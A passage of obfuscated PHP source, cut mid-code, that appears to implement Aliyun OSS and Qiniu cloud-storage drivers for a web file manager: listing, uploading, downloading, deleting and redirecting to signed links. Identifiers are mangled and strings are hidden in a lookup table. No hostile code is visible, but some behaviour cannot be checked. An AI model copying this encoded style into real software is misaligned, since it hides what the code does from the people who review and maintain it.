$òú±‚é» = '') { $¢µ÷ïûë =& $_SERVER[‹‰”››ê]; if ($this->isFileOutServer()) { return $this->fileOutServer($¿Õ“ÏÀ®, $Ô‹“¢°, $êÂÊšœ¼, $òú±‚é»); } if (!$êÂÊšœ¼) { $êÂÊšœ¼ = $this->pathThis($¿Õ“ÏÀ®); } $êÂÊšœ¼ = rawurlencode($êÂÊšœ¼); $Ìó©‘º = get_file_mime(get_path_ext($êÂÊšœ¼)); if ($Ìó©‘º == $¢µ÷ïûë[251]) { return parent::fileOut($¿Õ“ÏÀ®, $Ô‹“¢°, $êÂÊšœ¼, $òú±‚é»); } $Ô‹“¢° = $Ô‹“¢° ? $¢µ÷ïûë[1514] : $¢µ÷ïûë[1515]; $±½‘¸Í€ = array(OSS\OssClient::OSS_SUB_RESOURCE => $¢µ÷ïûë[1516] . rawurlencode("{$Ô‹“¢°}\73\146\x69\154\145\x6e\x61\155\x65\x3d{$êÂÊšœ¼}")); $¾±ùÊæí = $this->link($¿Õ“ÏÀ®, $±½‘¸Í€); $this->fileOutLink($¾±ùÊæí); } public function fileOutServer($ƒ¥À½°Ñ, $†¦Ü„í¥ = false, $®Š¸‰Ù = false, $üÚâ™¾ = '') { parent::fileOut($ƒ¥À½°Ñ, $†¦Ü„í¥, $®Š¸‰Ù, $üÚâ™¾); } public function fileOutImage($Îäïœúó, $—ê¡Õ–² = 250) { if ($this->size($Îäïœúó) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Îäïœúó, $—ê¡Õ–²); } $éÛ´îÅ„ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[‹‰”››ê][1478] . $—ê¡Õ–²); $÷¶øÅùœ = $this->link($Îäïœúó, $éÛ´îÅ„); $this->fileOutLink($÷¶øÅùœ); } public function fileOutImageServer($í±üÙõ, $ª££ñ— = 250) { parent::fileOutImage($í±üÙõ, $ª££ñ—); } public function fileOutLink($§¢„’½§) { $ÂÜ¼×ÒÜ =& $_SERVER[‹‰”››ê]; if (!$this->isCdnHost() && substr($§¢„’½§, 0, 7) == $ÂÜ¼×ÒÜ[219]) { $§¢„’½§ = $ÂÜ¼×ÒÜ[220] . substr($§¢„’½§, 7); } header($ÂÜ¼×ÒÜ[175] . $§¢„’½§); die; } public function hashMd5($°¿ïš¾Â, $±“´Ù½‘ = '') { $Û´“Ñ·Õ =& $_SERVER[‹‰”››ê]; $¸¬ñôÔ = $this->_objectMeta($°¿ïš¾Â); if (!$¸¬ñôÔ) { return $Û´“Ñ·Õ[12]; } if (!isset($¸¬ñôÔ[$Û´“Ñ·Õ[1498]]) && !empty($±“´Ù½‘)) { $´£ëä˜û = $this->updateObjMeta($°¿ïš¾Â, array($Û´“Ñ·Õ[1498] => $±“´Ù½‘)); $¸¬ñôÔ[$Û´“Ñ·Õ[1498]] = $´£ëä˜û ? $±“´Ù½‘ : $Û´“Ñ·Õ[12]; } return isset($¸¬ñôÔ[$Û´“Ñ·Õ[1498]]) ? strtolower($¸¬ñôÔ[$Û´“Ñ·Õ[1498]]) : $Û´“Ñ·Õ[12]; } public function size($‰‰ı”ğõ) { $Ïà†®Ò = $this->objectMeta($‰‰ı”ğõ); return $Ïà†®Ò ? $Ïà†®Ò[$_SERVER[‹‰”››ê][79]] : 0; } public function info($Áëóêñ€) { if ($this->isFolder($Áëóêñ€)) { return $this->folderInfo($Áëóêñ€); } else { if ($this->isFile($Áëóêñ€)) { return $this->fileInfo($Áëóêñ€); } } return !1; } public function exist($ƒˆíèıû) { return $this->isFile($ƒˆíèıû) || $this->isFolder($ƒˆíèıû); } public function isFile($¯Û¼²½) { return !$this->isFolder($¯Û¼²½) && $this->objectMeta($¯Û¼²½); } public function isFolder($êÆÍõ) { return $this->cacheMethod($_SERVER[‹‰”››ê][180], $êÆÍõ); } protected function objectMeta($îóÏ‹åÌ) { return $this->cacheMethod($_SERVER[‹‰”››ê][182], $îóÏ‹åÌ); } protected function _objectMeta($Ïß´²Õ) { $²Ä÷¶ä =& $_SERVER[‹‰”››ê]; try { $îÅÛÆ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Ïß´²Õ)); } catch (OSS\Core\OssException $å¾éÓÔ½) { $this->writeLog(__FUNCTION__ . $²Ä÷¶ä[215] . $å¾éÓÔ½->getMessage()); $îÅÛÆ = !1; } if ($îÅÛÆ) { $îÅÛÆ[$²Ä÷¶ä[79]] = intval($îÅÛÆ[$²Ä÷¶ä[1496]]); } return $îÅÛÆ; } protected function _isFolder($‚‚ŠöÉş) { $¼Šğ‡òÊ =& $_SERVER[‹‰”››ê]; if ($‚‚ŠöÉş == $¼Šğ‡òÊ[12] || $‚‚ŠöÉş == $¼Šğ‡òÊ[8]) { return !0; } $ÛÆôÕ…’ = array($¼Šğ‡òÊ[1491] => $¼Šğ‡òÊ[8], $¼Šğ‡òÊ[1492] => rtrim($‚‚ŠöÉş, $¼Šğ‡òÊ[8]) . $¼Šğ‡òÊ[8], $¼Šğ‡òÊ[1493] => 1, $¼Šğ‡òÊ[1494] => $¼Šğ‡òÊ[12]); $‚Õ‹ß†ª = $this->client->listObjects($this->bucket, $ÛÆôÕ…’); if ($‚Õ‹ß†ª->getObjectList() || $‚Õ‹ß†ª->getPrefixList()) { return !0; } return !1; } public function writeLog($ÙÃ¹‚±é = '', $—½£Ë’ë = false) { $ÉÏÀ×Êö =& $_SERVER[‹‰”››ê]; $ı±÷†‚Ã = in_array(ACTION, array($ÉÏÀ×Êö[213], $ÉÏÀ×Êö[214])); if (!$ı±÷†‚Ã && !GLOBAL_DEBUG) { return; } $ìë’á² = 0; if (stripos($ÙÃ¹‚±é, $ÉÏÀ×Êö[1517]) !== !1) { $ìë’á² = 1; $ÄÕ’Ö“Ş = explode($ÉÏÀ×Êö[1518], $ÙÃ¹‚±é); $ÙÃ¹‚±é = !empty($ÄÕ’Ö“Ş[1]) ? $ÄÕ’Ö“Ş[1] : $ÙÃ¹‚±é; } else { if (stripos($ÙÃ¹‚±é, $ÉÏÀ×Êö[1519])) { $ìë’á² = 2; $ÄÕ’Ö“Ş = explode($ÉÏÀ×Êö[1519], $ÙÃ¹‚±é); $ÄÕ’Ö“Ş = explode($ÉÏÀ×Êö[4], $ÄÕ’Ö“Ş[0]); $ÙÃ¹‚±é = !empty($ÄÕ’Ö“Ş[1]) ? $ÄÕ’Ö“Ş[1] : $ÙÃ¹‚±é; } } if ($ı±÷†‚Ã && I18n::getType() == $ÉÏÀ×Êö[1520]) { if ($ìë’á² == 1) { $ÙÃ¹‚±é = str_replace($ÉÏÀ×Êö[1521], $ÉÏÀ×Êö[1522], $ÙÃ¹‚±é); } else { if ($ìë’á² == 2) { $ÄÕ’Ö“Ş = explode($ÉÏÀ×Êö[215], $ÄÕ’Ö“Ş[0]); $¥êÅÙ¢Õ = isset($ÄÕ’Ö“Ş[1]) ? $ÄÕ’Ö“Ş[1] : $ÉÏÀ×Êö[12]; $êä¨ú¬Ö = array($ÉÏÀ×Êö[1523] => $ÉÏÀ×Êö[1524], $ÉÏÀ×Êö[1525] => $ÉÏÀ×Êö[1526], $ÉÏÀ×Êö[1527] => $ÉÏÀ×Êö[1528], $ÉÏÀ×Êö[1529] => $ÉÏÀ×Êö[1530], $ÉÏÀ×Êö[1531] => $ÉÏÀ×Êö[1532], $ÉÏÀ×Êö[1533] => $ÉÏÀ×Êö[1534], $ÉÏÀ×Êö[1535] => $ÉÏÀ×Êö[1536], $ÉÏÀ×Êö[1537] => $ÉÏÀ×Êö[1538], $ÉÏÀ×Êö[1539] => $ÉÏÀ×Êö[1540], $ÉÏÀ×Êö[1541] => $ÉÏÀ×Êö[1542]); if (isset($êä¨ú¬Ö[$¥êÅÙ¢Õ])) { $ÙÃ¹‚±é = $êä¨ú¬Ö[$¥êÅÙ¢Õ]; } } } if (stripos($ÙÃ¹‚±é, $ÉÏÀ×Êö[1543])) { $ÙÃ¹‚±é = $ÉÏÀ×Êö[1544]; } } if (!trim($ÙÃ¹‚±é)) { return; } parent::writeLog(trim($ÙÃ¹‚±é), $—½£Ë’ë); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ ×üë¥Ï) { parent::__construct(); require_once SDK_DIR . $_SERVER[‹‰”››ê][1545]; $this->_init($ ×üë¥Ï); } public function _init($±óõäÚæ) { $¢ÆË™Ñ³ =& $_SERVER[‹‰”››ê]; $this->config = $±óõäÚæ; foreach ($±óõäÚæ as $ÕçÂ÷ş® => $Å÷ıı×) { if (isset($this->{$ÕçÂ÷ş®})) { $this->{$ÕçÂ÷ş®} = $Å÷ıı×; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¢ÆË™Ñ³[1546] . LNG($¢ÆË™Ñ³[1482])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($‘º¨¯Ê‡, $§€­£ÑÊ = '', $ÂĞ»¸Œ´ = REPEAT_RENAME) { if ($this->setContent($‘º¨¯Ê‡, $§€­£ÑÊ)) { return $this->getPathOuter($‘º¨¯Ê‡); } return !1; } public function mkdir($Ä·–áéØ, $úé¶‡Áè = REPEAT_SKIP) { $ôšş“Ò‹ =& $_SERVER[‹‰”››ê]; $ØÏµü÷á = trim($Ä·–áéØ, $ôšş“Ò‹[8]); if ($this->_isFolder($ØÏµü÷á)) { return $this->getPathOuter($ØÏµü÷á); } $Ä·–áéØ = $ØÏµü÷á . $ôšş“Ò‹[8]; $ôÕıæåÍ = get_path_this($ØÏµü÷á); $ÃÙ§Ã›¹ = $Ä·–áéØ . $ôÕıæåÍ; if (!$this->mkfile($ÃÙ§Ã›¹)) { return !1; } if (!$this->moveFile($ÃÙ§Ã›¹, $Ä·–áéØ)) { $this->delFile($ÃÙ§Ã›¹); return !1; } return $this->getPathOuter($ØÏµü÷á); } public function copyFile($„Ò¾±”§, $œ­¥±–ß) { $Ú„¢­úè = $this->bucketManager->copy($this->bucket, $„Ò¾±”§, $this->bucket, $œ­¥±–ß, !0); return $Ú„¢­úè ? !1 : $this->getPathOuter($œ­¥±–ß); } public function moveFile($ãşŒë¶ï, $ş´œÔè—) { $ÆŞÛ¼œ = $this->bucketManager->move($this->bucket, $ãşŒë¶ï, $this->bucket, $ş´œÔè—, !0); return $ÆŞÛ¼œ ? !1 : $this->getPathOuter($ş´œÔè—); } public function delFile($òçãÂí) { if (!$this->exist($òçãÂí)) { return !0; } $Û–ŠÛ•Ã = $this->bucketManager->delete($this->bucket, $òçãÂí); if (!$Û–ŠÛ•Ã) { return !0; } return $Û–ŠÛ•Ã->code() == 612 ? !0 : !1; } public function delFolder($ßëÂñ‰Ë) { $€ÍÖ†ê´ =& $_SERVER[‹‰”››ê]; if (!$this->exist($ßëÂñ‰Ë)) { return !0; } $this->listItemCache = !1; $Å²‡İ×¼ = $this->fileList($ßëÂñ‰Ë); $this->listItemCache = !0; $ˆ‰º¦Ğ = trim($ßëÂñ‰Ë, $€ÍÖ†ê´[8]) . $€ÍÖ†ê´[8]; if (!empty($ßëÂñ‰Ë) && $ßëÂñ‰Ë !== $€ÍÖ†ê´[231] && !in_array($ˆ‰º¦Ğ, $Å²‡İ×¼[$€ÍÖ†ê´[85]])) { $Å²‡İ×¼[$€ÍÖ†ê´[85]][] = $ˆ‰º¦Ğ; } $½üœ¦§Ó = $this->delByBatch($Å²‡İ×¼[$€ÍÖ†ê´[86]]); if (!$½üœ¦§Ó) { return !1; } $½üœ¦§Ó = $this->delByBatch($Å²‡İ×¼[$€ÍÖ†ê´[85]]); if (!$½üœ¦§Ó) { return !1; } return $this->delFile($ˆ‰º¦Ğ); } private function delByBatch($şÔğÏ»Õ) { foreach (array_chunk($şÔğÏ»Õ, 1000) as $×ÉÔŠ¢) { $ƒÙ¾­€¾ = $this->bucketManager->buildBatchDelete($this->bucket, $×ÉÔŠ¢); list($ƒõµÅœ, $’î¼Í²’) = $this->bucketManager->batch($ƒÙ¾­€¾); if ($’î¼Í²’) { return !1; } } return !0; } public function rename($†‚¥Šå¨, $ÍÂ‹Âçâ) { return $this->renameObject($†‚¥Šå¨, $ÍÂ‹Âçâ); } public function fileInfo($Ò×ƒÓ, $ÂÔÎÄ¡Î = false, $•îÏ±å = array()) { $•¤ÉÏÙÌ =& $_SERVER[‹‰”››ê]; $İÏº¾¿ = array($•¤ÉÏÙÌ[32] => $this->pathThis($Ò×ƒÓ), $•¤ÉÏÙÌ[87] => $this->getPathOuter($•¤ÉÏÙÌ[8] . $Ò×ƒÓ), $•¤ÉÏÙÌ[33] => $•¤ÉÏÙÌ[233], $•¤ÉÏÙÌ[79] => isset($•îÏ±å[$•¤ÉÏÙÌ[1547]]) ? $•îÏ±å[$•¤ÉÏÙÌ[1547]] : 0, $•¤ÉÏÙÌ[169] => $this->ext($Ò×ƒÓ)); if ($ÂÔÎÄ¡Î) { return $İÏº¾¿; } $İÏº¾¿[$•¤ÉÏÙÌ[234]] = $İÏº¾¿[$•¤ÉÏÙÌ[88]] = 0; $İÏº¾¿[$•¤ÉÏÙÌ[235]] = $İÏº¾¿[$•¤ÉÏÙÌ[236]] = !0; if (empty($•îÏ±å)) { $•îÏ±å = $this->objectMeta($Ò×ƒÓ); if (!$•îÏ±å) { return $İÏº¾¿; } } if (isset($•îÏ±å[$•¤ÉÏÙÌ[237]]) && $•îÏ±å[$•¤ÉÏÙÌ[237]]) { $İÏº¾¿[$•¤ÉÏÙÌ[238]] = $•îÏ±å[$•¤ÉÏÙÌ[237]]; } if (isset($•îÏ±å[$•¤ÉÏÙÌ[248]]) && $•îÏ±å[$•¤ÉÏÙÌ[248]]) { $İÏº¾¿[$•¤ÉÏÙÌ[238]] = $•îÏ±å[$•¤ÉÏÙÌ[248]]; } if (isset($•îÏ±å[$•¤ÉÏÙÌ[1548]])) { $İÏº¾¿[$•¤ÉÏÙÌ[88]] = substr($•îÏ±å[$•¤ÉÏÙÌ[1548]] . $•¤ÉÏÙÌ[12], 0, 10); } if (isset($•îÏ±å[$•¤ÉÏÙÌ[1547]])) { $İÏº¾¿[$•¤ÉÏÙÌ[79]] = $•îÏ±å[$•¤ÉÏÙÌ[1547]]; } return $İÏº¾¿; } public function folderInfo($Øİ¬Ä•—, $Ù¬‡©ŞÍ = false) { $™Ç€æ€ä =& $_SERVER[‹‰”››ê]; $ÛÜ³ù‚Ú = array($™Ç€æ€ä[32] => $this->pathThis($Øİ¬Ä•—), $™Ç€æ€ä[87] => $this->getPathOuter($™Ç€æ€ä[8] . $Øİ¬Ä•—), $™Ç€æ€ä[33] => $™Ç€æ€ä[78]); if ($Ù¬‡©ŞÍ) { return $ÛÜ³ù‚Ú; } $ÛÜ³ù‚Ú[$™Ç€æ€ä[234]] = $ÛÜ³ù‚Ú[$™Ç€æ€ä[88]] = 0; $ÛÜ³ù‚Ú[$™Ç€æ€ä[235]] = $ÛÜ³ù‚Ú[$™Ç€æ€ä[236]] = !0; $Øİ¬Ä•— = rtrim($Øİ¬Ä•—, $™Ç€æ€ä[8]) . $™Ç€æ€ä[8]; $ Ù·ª£ˆ = $this->objectMeta($Øİ¬Ä•—); if (isset($ Ù·ª£ˆ[$™Ç€æ€ä[1548]])) { $ÛÜ³ù‚Ú[$™Ç€æ€ä[88]] = substr($ Ù·ª£ˆ[$™Ç€æ€ä[1548]] . $™Ç€æ€ä[12], 0, 10); } return $ÛÜ³ù‚Ú; } public function listPath($–ÖêµÙ, $åË¦œø = false) { $ÇºïÕ¥½ =& $_SERVER[‹‰”››ê]; $Ã“¨Åµ = $this->fileList($–ÖêµÙ, $ÇºïÕ¥½[8], !0); foreach ($Ã“¨Åµ[$ÇºïÕ¥½[85]] as $œşÎ›¿» => $ÚÇ¤­¾”) { $Ã“¨Åµ[$ÇºïÕ¥½[85]][$œşÎ›¿»] = $this->folderInfo($ÚÇ¤­¾”, $åË¦œø); } foreach ($Ã“¨Åµ[$ÇºïÕ¥½[86]] as $œşÎ›¿» => $ÚÇ¤­¾”) { $Ã“¨Åµ[$ÇºïÕ¥½[86]][$œşÎ›¿»] = $this->fileInfo($ÚÇ¤­¾”[$ÇºïÕ¥½[32]], $åË¦œø, $ÚÇ¤­¾”); } return $Ã“¨Åµ; } public function has($À˜¾ğáĞ, $öõ²¢² = false, $¢—ÚÇ© = true) { $—¬š¥Ú =& $_SERVER[‹‰”››ê]; $À˜¾ğáĞ = trim($À˜¾ğáĞ, $—¬š¥Ú[8]); $”æûÕ¶ = empty($À˜¾ğáĞ) && $À˜¾ğáĞ !== $—¬š¥Ú[231] ? $—¬š¥Ú[12] : $À˜¾ğáĞ . $—¬š¥Ú[8]; $„Ìöœ— = $—¬š¥Ú[12]; $Øãá›“— = 500; $ŠÂ¶¸ñÛ = $—¬š¥Ú[8]; $ç©š³ ‹ = $”ıêñò† = 0; while (!0) { check_abort(); list($Í¤Êì·, $µÆĞïÅè) = $this->bucketManager->listFiles($this->bucket, $”æûÕ¶, $„Ìöœ—, $Øãá›“—, $ŠÂ¶¸ñÛ); if ($µÆĞïÅè) { break; } $„Ìöœ— = array_key_exists($—¬š¥Ú[1494], $Í¤Êì·) ? $„Ìöœ— = $Í¤Êì·[$—¬š¥Ú[1549]] : $—¬š¥Ú[12]; if ($öõ²¢²) { if (!empty($Í¤Êì·[$—¬š¥Ú[1550]])) { $ç©š³ ‹ += count($Í¤Êì·[$—¬š¥Ú[1550]]); } if (!empty($Í¤Êì·[$—¬š¥Ú[1551]])) { $”ıêñò† += count($Í¤Êì·[$—¬š¥Ú[1551]]); } if ($„Ìöœ— === $—¬š¥Ú[12]) { break; } continue; } if ($¢—ÚÇ©) { if (!empty($Í¤Êì·[$—¬š¥Ú[1550]])) { return !0; } } else { if (!empty($Í¤Êì·[$—¬š¥Ú[1551]])) { return !0; } } if ($„Ìöœ— === $—¬š¥Ú[12]) { break; } } if ($öõ²¢²) { return array($—¬š¥Ú[242] => $ç©š³ ‹, $—¬š¥Ú[243] => $”ıêñò†); } return !1; } public function listAll($°Õ¥”ìŠ) { $ª¦à•ìö =& $_SERVER[‹‰”››ê]; $¿ö¬¯ÖÏ = $this->fileList($°Õ¥”ìŠ, $ª¦à•ìö[12], !0); $˜—¸¢£ = array_to_keyvalue($¿ö¬¯ÖÏ[$ª¦à•ìö[86]], $ª¦à•ìö[32]); foreach ($¿ö¬¯ÖÏ[$ª¦à•ìö[85]] as $—Š¯«èÜ) { if (is_string($—Š¯«èÜ)) { $˜—¸¢£[$—Š¯«èÜ] = array($ª¦à•ìö[79] => 0); } } return $this->listAllFiles($°Õ¥”ìŠ, $˜—¸¢£); } private function fileList($Ñ“„™š„, $õ†òúÉ = '', $ï¤“Ğ¨ç = 0) { $£Çƒ‡­¢ =& $_SERVER[‹‰”››ê]; $Ñ“„™š„ = trim($Ñ“„™š„, $£Çƒ‡­¢[8]); $€¾™À‘ = empty($Ñ“„™š„) && $Ñ“„™š„ !== $£Çƒ‡­¢[231] ? $£Çƒ‡­¢[12] : $Ñ“„™š„ . $£Çƒ‡­¢[8]; $ã›´å³ = $£Çƒ‡­¢[12]; $Í®Úª½„ = 1000; $Ö÷‘”•© = $ğÚ§òĞê = array(); while (!0) { check_abort(); list($óÙ‘µ, $áÌŸÕ…) = $this->bucketManager->listFiles($this->bucket, $€¾™À‘, $ã›´å³, $Í®Úª½„, $õ†òúÉ); if ($áÌŸÕ…) { break; } $ã›´å³ = array_key_exists($£Çƒ‡­¢[1494], $óÙ‘µ) ? $ã›´å³ = $óÙ‘µ[$£Çƒ‡­¢[1549]] : $£Çƒ‡­¢[12]; $¡½÷Øí = isset($óÙ‘µ[$£Çƒ‡­¢[1550]]) ? $óÙ‘µ[$£Çƒ‡­¢[1550]] : array(); $¹·æüş = isset($óÙ‘µ[$£Çƒ‡­¢[1551]]) ? $óÙ‘µ[$£Çƒ‡­¢[1551]] : array(); foreach ($¡½÷Øí as $œãä³¸á) { if ($œãä³¸á[$£Çƒ‡­¢[97]] == $€¾™À‘) { continue; } $ë©»À‘ = $œãä³¸á[$£Çƒ‡­¢[97]]; $ê¬ «è = $œãä³¸á[$£Çƒ‡­¢[1547]]; $œãä³¸á[$£Çƒ‡­¢[32]] = $ë©»À‘; $œãä³¸á[$£Çƒ‡­¢[79]] = $ê¬ «è; $ÊÉ”Èö = $ê¬ «è == 0 && substr($ë©»À‘, strlen($ë©»À‘) - 1, 1) == $£Çƒ‡­¢[8] ? !0 : !1; $this->cacheMethodInfoSet($ë©»À‘, $ÊÉ”Èö, $œãä³¸á); if ($ÊÉ”Èö) { $Ö÷‘”•©[] = $ë©»À‘; continue; } $ğÚ§òĞê[] = $ï¤“Ğ¨ç ? $œãä³¸á : $ë©»À‘; } foreach ($¹·æüş as $ë©»À‘) { if ($ë©»À‘ == $€¾™À‘) { continue; } $Ö÷‘”•©[] = $ë©»À‘; $this->cacheMethodInfoSet($ë©»À‘, !0); } if ($ã›´å³ === $£Çƒ‡­¢[12]) { break; } } $this->cacheMethodInfoSet($Ñ“„™š„, !0); return array($£Çƒ‡­¢[85] => $Ö÷‘”•©, $£Çƒ‡­¢[86] => $ğÚ§òĞê); } public function canRead($ç™²òËä) { return $this->exist($ç™²òËä) ? !0 : !1; } public function canWrite($çø¶Êò¼) { return $this->exist($çø¶Êò¼) ? !0 : !1; } public function getContent($ªâ‰Ùˆ·) { return $this->fileSubstr($ªâ‰Ùˆ·, 0, -1); } public function setContent($ú‡¹Êş¤, $Ğ­¸èçÏ = '') { $ºäïü¤À = $this->tempFile($this->pathThis($ú‡¹Êş¤)); file_put_contents($ºäïü¤À, $Ğ­¸èçÏ); if ($this->upload($ú‡¹Êş¤, $ºäïü¤À)) { $this->tempFileRemve($ºäïü¤À); return !0; } return !1; } public function refreshUrls($³’¦÷û) { $ºÏ…ˆ­² =& $_SERVER[‹‰”››ê]; $ªÅµäŞ‹ = array(); if (is_array($³’¦÷û)) { foreach ($³’¦÷û as $í™œç…¬) { $ªÅµäŞ‹[] = $this->link($í™œç…¬); } } else { $ªÅµäŞ‹[] = $this->link($³’¦÷û); } $ŒÓ´Š¥¾ = new Qiniu\Cdn\CdnManager($this->auth); list($°ıˆª˜œ, $ËÅ˜úâÂ) = $ŒÓ´Š¥¾->refreshUrls($ªÅµäŞ‹); if ($ËÅ˜úâÂ) { return !1; } return $°ıˆª˜œ[$ºÏ…ˆ­²[1280]] == $ºÏ…ˆ­²[849] ? !0 : !1; } public function fileSubstr($òİâŒñï, $—İŞ¾Ïş, $’Ù‰šİµ) { $¶àÁ¾ÈŒ =& $_SERVER[‹‰”››ê]; if (!($á÷æé®Ø = $this->link($òİâŒñï))) { return !1; } $·ëû®à = !1; if ($’Ù‰šİµ > 0) { $ÖÎÖÙ¼Ã = $—İŞ¾Ïş + $’Ù‰šİµ - 1; $·ëû®à = array($¶àÁ¾ÈŒ[1552] . $—İŞ¾Ïş . $¶àÁ¾ÈŒ[474] . $ÖÎÖÙ¼Ã); } $–ğ£áñÎ = url_request($á÷æé®Ø, $¶àÁ¾ÈŒ[1513], !1, $·ëû®à); return $–ğ£áñÎ[$¶àÁ¾ÈŒ[840]] ? $–ğ£áñÎ[$¶àÁ¾ÈŒ[1303]] : !1; } public function upload($Çä·È¸û, $ß©„¢‘ç, $ ŸÜáçõ = false, $Ç†®¶Ã = REPEAT_REPLACE) { $Ø­è€¾ñ = new Qiniu\Storage\UploadManager(); $ˆ‡Ñè¯› = $this->auth->uploadToken($this->bucket, $Çä·È¸û); $Œ½¤¯ªã = get_file_mime(get_path_ext($ß©„¢‘ç)); list($óÇ»‘ , $‰À‘™é) = $Ø­è€¾ñ->putFile($ˆ‡Ñè¯›, $Çä·È¸û, $ß©„¢‘ç, null, $Œ½¤¯ªã); return $‰À‘™é ? !1 : $this->getPathOuter($Çä·È¸û); } public function uploadFormData($³¦»¼Ö¡, $¿Ç¢Î» = 3600) { return $this->uploadToken($³¦»¼Ö¡, $¿Ç¢Î»); } public function uploadMultiData($·Ûº÷®©, $èìºùÕƒ = 3600) { return $this->uploadToken($·Ûº÷®©, $èìºùÕƒ); } private function uploadToken($Ì±åüñØ, $æ²áİ¸Ó = 3600) { $ğ£øĞˆÃ =& $_SERVER[‹‰”››ê]; $«Á‡£±™ = $æ²áİ¸Ó; $²Àæ’¤ä = array($ğ£øĞˆÃ[1553] => $ğ£øĞˆÃ[1554]); $‰Ôª€ºĞ = $Ì±åüñØ; $§„îˆÔà = $this->auth->uploadToken($this->bucket, $‰Ôª€ºĞ, $«Á‡£±™, $²Àæ’¤ä, !0); $Çü¦ãé = empty($this->region) || $this->region == $ğ£øĞˆÃ[1555] ? $ğ£øĞˆÃ[12] : $ğ£øĞˆÃ[474] . $this->region; $ä© ¾æƒ = http_type() . "\x3a\x2f\57\x75\x70\154\157\x61\x64{$Çü¦ãé}\56\161\151\156\151\x75\x70\56\x63\157\x6d\57"; return array($ğ£øĞˆÃ[1556] => $§„îˆÔà, $ğ£øĞˆÃ[1557] => $ä© ¾æƒ); } public function download($ŸäÏ­›«, $œä¹°õ¯) { $õ‡®²Ü´ = IO::getPathInner(IO::mkfile($œä¹°õ¯)); if (!($ãé½§Ù¨ = $this->link($ŸäÏ­›«))) { return !1; } $úıãõÊ = 0; $«¨š´è˜ = 1024 * 200; $Áà³è¥÷ = fopen($õ‡®²Ü´, $_SERVER[‹‰”››ê][1558]); while (!0) { $øàğ©èû = $this->fileSubstr($ŸäÏ­›«, $úıãõÊ, $«¨š´è˜); if ($øàğ©èû === !1) { return !1; } fwrite($Áà³è¥÷, $øàğ©èû); $úıãõÊ += $«¨š´è˜; if (strlen($øàğ©èû) < $«¨š´è˜) { break; } } fclose($Áà³è¥÷); return $œä¹°õ¯; } public function link($°‚íÈÁ¶, $³ŸÂ‰¦‡ = '') { if (!$this->isFile($°‚íÈÁ¶)) { return !1; } $Ì¹èğ÷‰ = $this->getHost() . $_SERVER[‹‰”››ê][8] . $this->pathEncode($°‚íÈÁ¶) . $³ŸÂ‰¦‡; return $this->auth->privateDownloadUrl($Ì¹èğ÷‰, 3600 * 12); } public function fileOut($ÌÂÎ¼–, $äÌÄ‰´ = false, $üıƒâ²¥ = false, $‹•Ã“„« = '') { $á¤»Õ =& $_SERVER[‹‰”››ê]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÌÂÎ¼–, $äÌÄ‰´, $üıƒâ²¥, $‹•Ã“„«); } if (!$üıƒâ²¥) { $üıƒâ²¥ = $this->pathThis($ÌÂÎ¼–); } $„±ËÓÑÄ = $äÌÄ‰´ ? $á¤»Õ[1559] . rawurlencode($üıƒâ²¥) : $á¤»Õ[12]; $ÊğªÒí¸ = $this->link($ÌÂÎ¼–, $„±ËÓÑÄ); $this->fileOutLink($ÊğªÒí¸); } public function fileOutServer($Ÿàáö÷ò, $Ü–Àï¿¼ = false, $”ó¡…Ÿ‡ = false, $®«Æ€¬€ = '') { parent::fileOut($Ÿàáö÷ò, $Ü–Àï¿¼, $”ó¡…Ÿ‡, $®«Æ€¬€); } public function fileOutImage($Ù‘É¡ï°, $ëË”§ß€ = 250) { if ($this->size($Ù‘É¡ï°) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Ù‘É¡ï°, $ëË”§ß€); } $Ç¢ÆàÙ£ = $this->link($Ù‘É¡ï°, $_SERVER[‹‰”››ê][1560] . $ëË”§ß€); $this->fileOutLink($Ç¢ÆàÙ£); } public function fileOutImageServer($ï”ûÃ½±, $­ùé€âû = 250) { parent::fileOutImage($ï”ûÃ½±, $­ùé€âû); } public function hashMd5($Ô£³—ñÜ) { $ÜÒÖâ =& $_SERVER[‹‰”››ê]; $ô»Ì¦¤ = $this->objectMeta($Ô£³—ñÜ); return isset($ô»Ì¦¤[$ÜÒÖâ[248]]) ? $ô»Ì¦¤[$ÜÒÖâ[248]] : !1; $î°•ÉØÒ = $this->link($Ô£³—ñÜ, $ÜÒÖâ[1561]); } public function size($Öí´÷äà) { $³œúÊŠÒ = $this->objectMeta($Öí´÷äà); return $³œúÊŠÒ ? $³œúÊŠÒ[$_SERVER[‹‰”››ê][79]] : 0; } public function info($óìÂüœÁ) { if ($this->isFolder($óìÂüœÁ)) { return $this->folderInfo($óìÂüœÁ); } else { if ($this->isFile($óìÂüœÁ)) { return $this->fileInfo($óìÂüœÁ); } } return !1; } public function exist($ôÉ°ßèš) { return $this->isFile($ôÉ°ßèš) || $this->isFolder($ôÉ°ßèš); } public function isFile($ÒùÖ¦Î) { return !$this->isFolder($ÒùÖ¦Î) && $this->objectMeta($ÒùÖ¦Î); } public function isFolder($Ï¯¾õ™½) { return $this->cacheMethod($_SERVER[‹‰”››ê][180], $Ï¯¾õ™½); } protected function objectMeta($‰‘ŞÃö‡) { return $this->cacheMethod($_SERVER[‹‰”››ê][182], $‰‘ŞÃö‡); } protected function _objectMeta($ÙîüŒĞ³) { $øø•‚¨´ =& $_SERVER[‹‰”››ê]; list($É†¥Íş£, $„™¾úÛÇ) = $this->bucketManager->stat($this->bucket, $ÙîüŒĞ³); if ($É†¥Íş£) { $É†¥Íş£[$øø•‚¨´[79]] = intval($É†¥Íş£[$øø•‚¨´[1547]]); } return $É†¥Íş£; } protected function _isFolder($²¬óŸè°) { $û™ğ‡ó =& $_SERVER[‹‰”››ê]; if ($²¬óŸè° == $û™ğ‡ó[12] || $²¬óŸè° == $û™ğ‡ó[8]) { return 